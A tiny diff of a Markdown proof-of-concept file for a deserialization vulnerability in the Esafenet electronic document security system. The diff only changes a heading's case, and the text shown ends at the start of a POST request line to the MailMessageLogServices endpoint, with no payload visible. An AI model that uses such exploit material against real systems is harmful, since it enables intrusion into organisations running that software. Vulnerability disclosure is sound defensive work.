@@ -1,6 +1,6 @@
 ## 亿赛通电子文档安全管理系统-MailMessageLogServices反序列漏洞
 
-## poc
+## POC
 ```
 POST /CDGServer3/MailMessageLogServices HTTP/1.1
 Host:
